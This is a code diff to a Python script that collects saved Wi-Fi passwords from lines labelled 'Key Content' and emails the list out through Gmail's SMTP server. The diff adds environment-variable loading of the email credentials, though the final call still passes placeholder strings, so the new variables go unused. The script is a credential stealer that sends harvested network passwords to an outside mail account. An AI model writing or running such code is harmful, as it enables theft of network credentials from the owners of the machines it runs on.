@@ -1,9 +1,10 @@
-import subprocess, re, smtplib
+import subprocess, re, smtplib, decouple
+
 
 def send_mail(email, password, message):
-    '''
+    """
     send_mail function sends the list of passwords through given email
-    '''
+    """
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()
     server.login(email, password)
@@ -43,6 +44,7 @@ for i in result:
         content += i + " "
     if "Key Content" in i:
         content += i + "\n\n"
-'''Enter your email and password in the function parameters'''
-send_mail("<Enter your gmail>", "<Enter your gmail password>", content)
 
+email = decouple.config("EMAIL")
+password = decouple.config("PASSWORD")
+send_mail("<Enter your gmail>", "<Enter your gmail password>", content)
